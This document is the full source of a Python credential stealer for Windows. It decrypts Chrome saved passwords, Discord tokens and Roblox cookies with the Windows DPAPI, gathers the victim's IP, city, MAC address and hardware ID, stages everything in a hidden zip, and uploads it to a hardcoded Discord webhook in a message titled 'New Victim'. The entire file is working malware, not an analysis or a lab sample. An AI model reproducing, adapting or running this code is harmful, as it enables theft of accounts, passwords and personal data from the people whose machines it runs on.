import os
import re
import json
import shutil
import time
import win32con
from base64 import b64decode
from subprocess import Popen, PIPE
from win32api import SetFileAttributes
from win32crypt import CryptUnprotectData
from requests import post
from tempfile import TemporaryDirectory
from zipfile import ZipFile, ZIP_DEFLATED

WEBHOOK_URL = "https://discord.com/api/webhooks/1493964782330577168/XZ4U3d4so35qor9X6Avk9PQHXMxBUPGqhvVBRgH9YsjXOCb5n1wR0xrFG8l0THgeZcm_"

SOCIAL_MEDIA_DOMAINS = [
    "discord.com", "discordapp.com", "twitter.com", "instagram.com", "facebook.com",
    "tiktok.com", "snapchat.com", "vk.com", "youtube.com", "gmail.com", "google.com",
    "outlook.com", "live.com", "yahoo.com", "hotmail.com", "messenger.com", "github.com",
    "linkedin.com", "skype.com", "telegram.org", "reddit.com", "pinterest.com", "tumblr.com"
]

def get_mac_address():
    try:
        output = os.popen("getmac").read()
        match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', output)
        if match:
            return match.group(0)
        return "NotFound"
    except:
        return "NotFound"

def get_hwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdout=PIPE, stderr=PIPE)
    try:
        out = (p.stdout.read() + p.stderr.read()).decode(errors="ignore").split("\n")[1].strip()
        return out
    except Exception:
        return "Unknown"

def get_ipinfo():
    try:
        import urllib.request
        ip = urllib.request.urlopen("https://api64.ipify.org").read().decode().strip()
        country = urllib.request.urlopen(f"https://ipapi.co/{ip}/country_name").read().decode().strip()
        city = urllib.request.urlopen(f"https://ipapi.co/{ip}/city").read().decode().strip()
        return ip, country, city
    except Exception:
        return "Unknown", "Unknown", "Unknown"

def find_discord_tokens():
    tokens = []
    paths = [
        os.path.join(os.getenv('APPDATA') or "", "Discord"),
        os.path.join(os.getenv('APPDATA') or "", "discordcanary"),
        os.path.join(os.getenv('APPDATA') or "", "discordptb"),
        os.path.join(os.getenv('APPDATA') or "", "Lightcord")
    ]
    pattern = r"dQw4w9WgXcQ:([^\"]+)"
    key = None
    for path in paths:
        try:
            local_state = os.path.join(path, "Local State")
            if os.path.isfile(local_state):
                with open(local_state, "r", encoding="utf-8") as f:
                    local_state_data = json.loads(f.read())
                    key = b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
                    key = CryptUnprotectData(key, None, None, None, 0)[1]
        except: key = None
        try:
            leveldb = os.path.join(path, "Local Storage", "leveldb")
            if not os.path.exists(leveldb):
                continue
            for filename in os.listdir(leveldb):
                if not filename.endswith(".ldb") and not filename.endswith(".log"):
                    continue
                filepath = os.path.join(leveldb, filename)
                with open(filepath, "r", errors="ignore") as file:
                    for line in file:
                        for match in re.findall(pattern, line):
                            rawtok = "dQw4w9WgXcQ:" + match
                            try:
                                decrypted = CryptUnprotectData(b64decode(match), None, None, None, 0)[1]
                                if decrypted:
                                    tokens.append(decrypted.decode(errors="ignore"))
                                else:
                                    tokens.append(match)
                            except:
                                tokens.append(match)
        except Exception:
            continue
    cleaned = []
    for t in tokens:
        t = t.replace("\\", "")
        if t and t not in cleaned:
            cleaned.append(t)
    return cleaned

def get_chrome_passwords(tmpdir):
    passwords = []
    website_login_data = {}
    social_media_logins = {}

    def is_social_media(domain):
        for social in SOCIAL_MEDIA_DOMAINS:
            if social.lower() in domain.lower():
                return True
        return False

    try:
        login_db = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"
        )
        cpy = os.path.join(tmpdir, "LoginData.db")
        if not os.path.exists(login_db):
            return [], {}, {}
        shutil.copy2(login_db, cpy)
        import sqlite3
        db = sqlite3.connect(cpy)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        key = None
        # Get encryption key
        try:
            with open(os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Google",
                "Chrome",
                "User Data",
                "Local State",
            ), "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
                key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                key = CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception:
            key = None
        for url, username, pwd in cursor.fetchall():
            if key:
                try:
                    password = CryptUnprotectData(pwd, None, None, None, 0)[1]
                    password = password.decode(errors='ignore')
                except Exception:
                    password = ""
            else:
                try:
                    password = CryptUnprotectData(pwd, None, None, None, 0)[1]
                    password = password.decode(errors='ignore')
                except Exception:
                    password = ""
            if username or password:
                passwords.append([username, password, url])
                # Group by domain for easier reporting
                domain = re.sub(r'^https?://(www\.)?', '', url).split('/')[0]
                if domain:
                    # Separate Social Media logins
                    if is_social_media(domain):
                        if domain not in social_media_logins:
                            social_media_logins[domain] = []
                        social_media_logins[domain].append({"username": username, "password": password, "url": url})
                    else:
                        if domain not in website_login_data:
                            website_login_data[domain] = []
                        website_login_data[domain].append({"username": username, "password": password, "url": url})
        cursor.close()
        db.close()
    except Exception:
        pass
    return passwords, website_login_data, social_media_logins

def find_roblox_tokens():
    roblox_keywords = ['roblox', 'krnl', 'synapse', 'electron', 'hydrogen', 'script-ware']
    process_ctx = ' '.join(os.sys.argv).lower()
    try:
        import psutil
        parent = psutil.Process(os.getpid()).parent()
        process_ctx += ' ' + parent.name().lower()
    except Exception:
        pass
    if not any(k in process_ctx for k in roblox_keywords):
        return {}

    cookie_paths = [
        os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies"
        ),
        os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"
        ),
    ]
    roblox_cookies = {}
    for cookie_path in cookie_paths:
        if not os.path.exists(cookie_path):
            continue
        try:
            import sqlite3
            db = sqlite3.connect(cookie_path)
            cursor = db.cursor()
            cursor.execute(
                "SELECT host_key, name, path, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com'"
            )
            key = None
            chrome_local_state = os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Google",
                "Chrome",
                "User Data",
                "Local State",
            )
            try:
                if os.path.exists(chrome_local_state):
                    with open(chrome_local_state, "r", encoding="utf-8") as f:
                        local_state = json.loads(f.read())
                        key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                        key = CryptUnprotectData(key, None, None, None, 0)[1]
            except Exception:
                key = None
            for host_key, name, path_, enc_val in cursor.fetchall():
                cookie_val = ""
                if key:
                    try:
                        cookie_val = CryptUnprotectData(enc_val, None, None, None, 0)[1].decode(errors='ignore')
                    except Exception:
                        cookie_val = ""
                else:
                    try:
                        cookie_val = CryptUnprotectData(enc_val, None, None, None, 0)[1].decode(errors='ignore')
                    except Exception:
                        cookie_val = ""
                if cookie_val:
                    if host_key not in roblox_cookies:
                        roblox_cookies[host_key] = []
                    roblox_cookies[host_key].append({"name": name, "path": path_, "value": cookie_val})
            cursor.close()
            db.close()
        except Exception:
            continue
    return roblox_cookies

def format_website_logins(logins):
    out = []
    for i, entry in enumerate(logins, 1):
        out.append(f"--- Login #{i} ---")
        out.append(f"URL          : {entry['url']}")
        out.append(f"Username/Email: {entry['username']}")
        out.append(f"Password     : {entry['password']}")
        out.append("")
    return "\n".join(out)

def format_roblox_cookies(roblox_cookies):
    out = []
    cnt = 1
    for domain, cookies in roblox_cookies.items():
        out.append(f"== {domain} ==")
        for c in cookies:
            out.append(f"Cookie Name: {c['name']}")
            out.append(f"  Path: {c['path']}")
            out.append(f"  Value: {c['value']}")
            out.append("")
        out.append("")
        cnt += 1
    return "\n".join(out)

def table(rows, header):
    if not rows:
        return ""
    rows = [header] + rows
    col_widths = [max(len(str(x)) for x in col) for col in zip(*rows)]
    lines = []
    for i, row in enumerate(rows):
        ln = "| " + " | ".join(str(x).ljust(col_widths[j]) for j, x in enumerate(row)) + " |"
        lines.append(ln)
        if i==0:
            lines.append("| " + " | ".join('-'*col_widths[j] for j in range(len(row))) + " |")
    return "\n".join(lines)

def collect_and_send():
    ip, country, city = get_ipinfo()
    mac = get_mac_address()
    hwid = get_hwid()
    discord_tokens = find_discord_tokens()
    roblox_cookies = find_roblox_tokens()
    with TemporaryDirectory(dir=".") as td:
        SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
        # Save Discord tokens
        disco_file = os.path.join(td, "discord_tokens.txt")
        with open(disco_file, "w") as f:
            f.write("\n".join(discord_tokens) if discord_tokens else "No Discord tokens found.")

        # Save Chrome passwords: everything in one file except for social media, which go into their own separate file per social
        chrome_pwds, website_login_data, social_media_logins = get_chrome_passwords(td)

        chrome_file = os.path.join(td, "chrome_passwords.txt")
        # All (non-social) logins in one file
        all_non_social = []
        for domain, entries in website_login_data.items():
            for entry in entries:
                all_non_social.append([entry['username'], entry['password'], entry['url']])
        with open(chrome_file, "w", encoding="utf-8") as f:
            f.write(table(all_non_social, ["Username/Email", "Password", "URL"]))

        # Each social media site gets its own file, but all other websites do NOT get their own
        for domain, logins in social_media_logins.items():
            domain_clean = domain.replace(':', '_').replace('/', '_')
            filename = os.path.join(td, f"{domain_clean}_logins.txt")
            with open(filename, "w", encoding="utf-8") as f:
                f.write(format_website_logins(logins))

        # Save Roblox session tokens/cookies if running in Roblox context
        if roblox_cookies:
            roblox_file = os.path.join(td, "roblox_cookies.txt")
            with open(roblox_file, "w", encoding='utf-8') as f:
                f.write(format_roblox_cookies(roblox_cookies))
        # Zip collected files
        zip_path = os.path.join(td, "data.zip")
        with ZipFile(zip_path, "w", ZIP_DEFLATED) as zipf:
            zipf.write(disco_file)
            zipf.write(chrome_file)
            for domain in social_media_logins:
                domain_clean = domain.replace(':', '_').replace('/', '_')
                filename = os.path.join(td, f"{domain_clean}_logins.txt")
                zipf.write(filename)
            if roblox_cookies:
                roblox_file = os.path.join(td, "roblox_cookies.txt")
                zipf.write(roblox_file)
        username = os.getenv("UserName", "Unknown")
        compname = os.getenv("COMPUTERNAME", "Unknown")
        content = (
            f"**New Victim**\n"
            f"**Username:** {username}\n"
            f"**Computer:** {compname}\n"
            f"**IP:** {ip}\n"
            f"**Country:** {country}\n"
            f"**City:** {city}\n"
            f"**MAC:** {mac}\n"
            f"**HWID:** {hwid}\n"
            f"**Discord Tokens Found:** {len(discord_tokens)}\n"
            f"**Passwords Grabbed:** {len(chrome_pwds)}\n"
            f"**Website Logins (non-social):** {sum(len(lst) for lst in website_login_data.values())}\n"
            f"**Social Media Sites:** {', '.join(social_media_logins.keys()) if social_media_logins else 'None'}\n"
            f"**Roblox Cookies Found:** {'Yes' if roblox_cookies else 'No'}"
        )
        post(WEBHOOK_URL, data={"content": content})
        with open(zip_path, "rb") as f:
            post(WEBHOOK_URL, files={"file": (f"data_{username}.zip", f, "application/zip")}, data={"content": "Dumped Data"})

if __name__ == "__main__":
    collect_and_send()
